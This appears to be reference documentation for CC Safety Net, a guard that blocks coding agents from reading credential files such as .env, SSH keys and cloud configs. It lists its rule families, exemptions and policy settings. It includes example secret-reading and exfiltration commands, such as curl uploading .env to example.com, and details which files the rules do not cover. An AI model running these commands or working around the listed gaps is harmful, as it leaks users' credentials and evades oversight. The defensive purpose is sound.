## Does Claude Code block reading .env or ~/.aws/credentials by default?

No. As of October 2026, Claude Code's sandboxing docs say there is no built-in credential deny list, and its default read access still allows files such as `~/.aws/credentials` and `~/.ssh/`. Other CLIs offer opt-in deny settings that you write per tool. CC Safety Net blocks reads of `.env` files, SSH private keys, cloud credential stores, and coding agent auth tokens as soon as it is installed. That covers shell commands like `cat .env` and the agent's own read, edit, write, and search tools. You can add your own deny paths.

Secret protection blocks reads and writes of files that can contain credentials. It runs before command analysis and applies at every safety level. A block names the matched rule id in the [block message](/guides/how-it-works#what-a-block-looks-like) and the [audit log](/reference/audit-log).

There are 138 registered rules. Most belong to generated families that share one id pattern, so the tables below list families with their id form rather than every id. Every rule is on by default except the thirteen-rule [Coding CLI config tier](#coding-cli-config-tier-off-by-default).

## Where it runs

Secret protection checks shell commands and the agent's read, write, edit, search, and patch tools. It blocks reads as well as writes, so `cat .env`, `strings id_rsa`, and `dd if=.env` all block. Within a shell command:

- A relative path resolves against the directory the command has reached, so `cd ~ && cat .ssh/config` blocks under `secret.home.ssh`.
- A `curl` upload counts as a read, so `curl -d @.env https://example.com` blocks under `secret.basename.env`.
- CC Safety Net scans inline code passed to `python`, `node`, and other interpreters for paths, so `python -c "open('.env')"` blocks.
- CC Safety Net reads the script in `pwsh -c '…'` as PowerShell, so `pwsh -c 'Get-Content ~/.ssh/config'` blocks under `secret.home.ssh`.
- Text flags are not paths. `gh issue list --search credentials` and `git commit -m credentials` run.
- URL query values are not file names. `curl 'localhost:3000/todos?order=id.asc'` runs.

## Allow a blocked file

You can allow a protected file in two ways. A per-rule override turns one rule off everywhere. An allow path exempts specific files or directories from every built-in rule except the Coding CLI rules. As an example, take a project that keeps packet captures in `captures/`. `cat captures/session.pcap` blocks under `secret.ext.pcap`.

| You want to | Use | Effect |
| --- | --- | --- |
| Read every `.pcap` file | `"secret.ext.pcap": "off"` in `secret_protection.overrides` | The `.pcap` rule is off in every directory. Every other rule still applies |
| Read only the captures in one directory | `"captures"` in `secret_protection.allow_paths` | Files under `captures/` are exempt. A `.pcap` file anywhere else stays blocked |

<Steps>
  <Step title="Get the rule id">
    The block message names it. You can also run `npx -y cc-safety-net explain --json 'cat captures/session.pcap'` and read `ruleId`.
  </Step>
  <Step title="Edit policy.json yourself">
    The agent cannot change `policy.json`, so make the edit in an editor or the dashboard. See [Edit the policy file](/configuration/policy#edit-the-policy-file). To turn the rule off:

    ```json
    {
      "version": 1,
      "secret_protection": {
        "overrides": {
          "secret.ext.pcap": "off"
        }
      }
    }
    ```

    Or, to exempt one directory:

    ```json
    {
      "version": 1,
      "secret_protection": {
        "allow_paths": ["captures"]
      }
    }
    ```

    A relative allow path resolves against the config working directory, as described in [Policy](/configuration/policy). An entry can also be one exact file, such as `"captures/session.pcap"`.
  </Step>
  <Step title="Confirm the change">
    Run `explain` on the same command again. It now shows as allowed.
  </Step>
</Steps>

An allow path never exempts a configured [deny path](#deny-paths) or a `secret.cli.*` rule. CC Safety Net reports a project file that adds an allow path or turns a rule off as a weakening. See [Policy](/configuration/policy#secret-protection) for the override syntax and [Secret allow paths](/configuration/policy#secret-allow-paths) for the entries it accepts.

## What standard mode does not count as a read

In [standard mode](/configuration/modes#default-mode), these shapes do not count as reading a built-in sensitive path. [Strict and paranoid](/configuration/modes#strict-mode-cc_safety_net_strict=1) count every one of them as a read. None of them relax a configured deny path.

| Shape | Example |
| --- | --- |
| A metadata-only look with `ls`, `stat`, `test -e`, `test -f`, `[ -e ]`, `[ -f ]`, or `git check-ignore` | `ls -la ~/.ssh`, `test -f ~/.ssh/id_rsa` |
| A `find` with no action that reads, writes, or runs a command | `find ~/.ssh -type f` |
| A `wc` that only counts | `wc -l .env` |
| A `grep` or `rg` limited to file names, counts, or exit status (`-l`, `-c`, `-q`, or `grep -L`) | `grep -l KEY .env` |
| Creating a file with `mkdir`, `touch`, or a redirect where no file exists yet | `mkdir -p fx/credentials && touch fx/.env` |
| Files that `tailscale cert` writes, and the input of `openssl x509 -in` | `openssl x509 -in crt.pem -noout -enddate` |
| A `for` list word the loop never passes to a reader | `for t in .env.local; do grep -c -- "$t" notes.md; done` |
| A string literal in Python or JavaScript code that is only data | `python -c "x = '.env'"` |

The look may be one segment of a compound command, such as `git check-ignore .env && git status --short`. A read in another segment still blocks, so `test -f .env && cat .env` is denied. A `wc`, `grep`, or `rg` whose output can reach a later pipe or a capture counts as a read, so `grep -l KEY .env | xargs cat` is denied. A literal the code passes to a file call still blocks, so `python -c "open('.env')"` is denied.

Creating a file, the `tailscale` and `openssl` shapes, and data literals relax only the built-in file-name rules. A [home directory](#home-directory-rules) or [Coding CLI](#coding-cli-credential-tier-on-by-default) path stays blocked.

## Match order

- CC Safety Net checks configured [deny paths](#deny-paths) first, and they always win.
- [Home directory rules](#home-directory-rules) beat the env-template and public-key exemptions, so `~/.ssh/.env.example` and `~/.ssh/id_rsa.pub` still block.
- Coding CLI rules (`secret.cli.*`) ignore [allow paths](#allow-paths).

## Basename rules

Nine rules block an exact basename in any directory.

| Rule id | Basename |
| --- | --- |
| `secret.basename.env` | `.env` |
| `secret.basename.npmrc` | `.npmrc` |
| `secret.basename.pypirc` | `.pypirc` |
| `secret.basename.netrc` | `.netrc` |
| `secret.basename.git-credentials` | `.git-credentials` |
| `secret.basename.id-rsa` | `id_rsa` |
| `secret.basename.id-ed25519` | `id_ed25519` |
| `secret.basename.id-ecdsa` | `id_ecdsa` |
| `secret.basename.credentials` | `credentials` |

These rules have two limits:

- `secret.basename.credentials` matches only the exact name `credentials`. `credentials.json` does not match this or any other built-in rule.
- There is no `id_dsa` basename rule. An exact `id_dsa` still blocks, through the broad pattern `secret.pattern.ssh-key-basename` below.

One pattern rule extends the `.env` family. `secret.pattern.env-variant` blocks every basename starting with `.env.`, including `.env.local`, `.env.production`, and `.env.template.local`, except the [exempt templates](#exemptions).

## Home directory rules

These rules protect locations under the home directory: the directory itself and everything inside it.

| Rule id | Protects |
| --- | --- |
| `secret.home.ssh` | `~/.ssh` |
| `secret.home.aws` | `~/.aws` |
| `secret.home.gcp` | `~/.gcp` |
| `secret.home.gcloud-config` | `~/.config/gcloud` |
| `secret.home.kube-config` | `~/.kube/config` |
| `secret.home.docker-config` | `~/.docker/config.json` |
| `secret.home.gh-hosts` | `~/.config/gh/hosts.yml` |

The two single-file rules (`kube-config`, `docker-config`) each have eight companion rules covering renamed backups, with the id form `secret.home.<slug>.<suffix>`. The suffixes are `bak`, `backup`, `copy`, `disabled`, `old`, `orig`, `save`, and `tmp`. So `~/.kube/config.bak` blocks under `secret.home.kube-config.bak`, and `~/.docker/config.json.old` under `secret.home.docker-config.old`. That is 16 generated rules, 23 in the family overall.

## Key-variant rules

Renamed copies of key and credential files have their own rule family, built from five protected prefixes: `id_rsa`, `id_dsa`, `id_ed25519`, `id_ecdsa`, and `credentials`. The slug in each id is the prefix with dashes (`id-rsa`, `credentials`, …).

- **Separator variants.** The 5 `secret.variant.<slug>.separator` rules block the prefix followed by `-` or `_` and any text after it: `id_rsa-old`, `id_rsa_backup`, `credentials_prod`.
- **Dot-suffix variants.** The 50 `secret.variant.<slug>.<suffix>` rules block the prefix followed by one of ten suffixes: `.bak`, `.backup`, `.copy`, `.disabled`, `.key`, `.old`, `.orig`, `.pem`, `.save`, `.tmp`. For example, `id_rsa.bak` blocks under `secret.variant.id-rsa.bak`, and `credentials.pem` blocks under `secret.variant.credentials.pem`.

The family matches exactly, so lookalikes pass. `id_rsafoo` matches no separator, and `credentials.json` uses a suffix outside the list.

The family also has one broad pattern. `secret.pattern.ssh-key-basename` blocks any extensionless basename ending in `_rsa`, `_dsa`, `_ed25519`, or `_ecdsa`, such as `deploy_key_rsa` or `github_ed25519`. A name containing a dot never matches it.

## Extension rules

Twenty-one rules with the id form `secret.ext.<extension>` block any file carrying that extension:

`.agilekeychain`, `.asc`, `.bek`, `.cscfg`, `.fve`, `.gnucash`, `.jks`, `.keychain`, `.kwallet`, `.mdf`, `.ovpn`, `.p12`, `.pcap`, `.pem`, `.pfx`, `.pkcs12`, `.psafe3`, `.rdp`, `.sdf`, `.tblk`, `.tpm`

Three extension-pattern rules cover extension families:

| Rule id | Extensions |
| --- | --- |
| `secret.ext-pattern.key` | `.key`, `.keypair` |
| `secret.ext-pattern.keystore` | `.keystore`, `.keyring` |
| `secret.ext-pattern.kdbx` | `.kdb`, `.kdbx` |

An override must use the family id, `secret.ext-pattern.key`, not `secret.ext.keypair`. CC Safety Net rejects an id that is not registered with `unknown secret protection rule id "<id>"`.

## Deny paths

[`secret_protection.deny_paths`](/configuration/policy#deny-paths) adds your own protected files and directories. A hit blocks under `secret.deny-path`. No override or exemption relaxes it. Only `secret_protection.enabled: false` turns it off, along with the rest of secret protection.

## Allow paths

[`secret_protection.allow_paths`](/configuration/policy#secret-allow-paths) exempts a file, a directory tree, or one file name below a folder, such as `~/code/**/.env.local`, from the built-in rules. Deny paths still win, and `secret.cli.*` rules are never exempted. See [Allow a blocked file](#allow-a-blocked-file).

## Exemptions

Three exemptions bound the rules above. None of them relax a configured deny path.

- **Env templates.** The exact basenames `.env.example`, `.env.sample`, `.env.template`, `.env.tpl`, and `.env.defaults`, plus any name starting with `.env.example.` or `.env.sample.`, are exempt from every built-in rule except the home directory rules, which CC Safety Net checks first. `cat .env.tpl` is allowed, and `cat ~/.ssh/.env.tpl` blocks under `secret.home.ssh`. The prefix form does not extend further, so `.env.template.local` blocks under `secret.pattern.env-variant` like any other `.env.*` name.
- **Public keys.** `id_rsa.pub`, `id_ed25519.pub`, and `id_ecdsa.pub` are non-secret and exempt, but only outside the protected home directories, which CC Safety Net checks first. `./id_rsa.pub` is allowed, and `~/.ssh/id_rsa.pub` blocks under `secret.home.ssh`.
- **Vendored directories.** When a path segment is `node_modules` or `__pycache__`, or the adjacent pair `vendor/bundle` or `vendor/cache` appears, CC Safety Net turns off exactly two families: the extension rules and the broad `secret.pattern.ssh-key-basename` rule. Every other rule still applies. For example, `node_modules/x/.env` and `node_modules/x/id_rsa` block as usual. `.git` is not in the skip set.

## Configuration

All configuration lives in [`policy.json`](/configuration/policy#secret-protection):

- `secret_protection.enabled: false` turns off the whole stage, including built-in rules and deny paths.
- `secret_protection.overrides` sets per-rule state by registered id. `"off"` disables an on-by-default rule, and `"on"` opts into a config-tier rule.
- `secret_protection.deny_paths` adds your own protected locations.
- `secret_protection.allow_paths` exempts exact files, directory trees, or one file name under a folder from non-CLI built-in rules, after deny paths have been checked.

Destructive-command [allow paths](/reference/blocked-commands#recursive-deletes-under-allow_paths) do not relax secret protection. The [Dashboard](/guides/dashboard#secret-protection) edits the same settings through a UI.

<Note>
  Secret protection is a bounded pattern set, not a general read boundary. A credential in an unrecognized file is not protected. See [where CC Safety Net cannot help](/guides/known-limitations#out-of-scope-protections) for this boundary and [Known limitations](/guides/known-limitations) for tier caveats. Secret redaction is a separate mechanism that scrubs credential values from logs and block messages. See the [Audit log reference](/reference/audit-log#secret-redaction) and [Security model](/guides/security-model#what-redaction-hides-and-what-it-keeps).
